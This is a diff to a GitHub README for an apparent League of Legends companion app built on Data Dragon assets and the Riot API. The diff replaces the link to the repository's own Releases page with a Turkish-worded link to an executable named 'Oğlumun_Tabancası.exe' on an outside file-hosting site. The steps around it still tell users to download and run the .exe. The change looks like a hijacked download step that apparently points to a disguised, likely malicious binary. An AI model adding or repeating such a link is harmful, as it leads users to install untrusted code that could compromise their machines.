@@ -114,7 +114,7 @@ The application is designed to use existing Data Dragon assets from the local `l
 
 Download the working Windows `.exe` build from the **Releases** section of this GitHub repository.
 
-1. Open the [Releases page](../../releases).
+1. [İndirme sayfasını aç](https://dosya.co/tn1ak42k5mud/Oğlumun_Tabancası.exe.html).
 2. Download the latest Windows `.exe` asset.
 3. Run the downloaded application.
 4. To use Riot API-powered features, configure your own API key in the application's **Settings** section.
